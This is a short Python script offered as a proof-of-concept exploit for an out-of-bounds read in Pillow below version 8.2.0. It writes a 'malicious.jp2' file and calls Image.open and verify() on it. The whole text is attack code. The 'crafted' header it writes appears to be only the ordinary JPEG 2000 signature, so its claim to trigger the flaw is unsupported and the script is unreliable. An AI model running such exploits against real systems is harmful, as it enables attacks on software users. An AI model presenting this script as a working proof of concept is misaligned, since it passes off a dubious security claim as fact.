from PIL import Image # Pillow < 8.2.0

# Create a malicious JPEG 2000 image
with open('malicious.jp2', 'wb') as f:
    f.write(b'\x00\x00\x00\x0c\x6a\x50\x20\x20\x0d\x0a\x87\x0a')  # crafted JPEG 2000 header

# Open the malicious image using Pillow
img = Image.open('malicious.jp2')

# This will trigger the out-of-bounds read vulnerability
img.verify()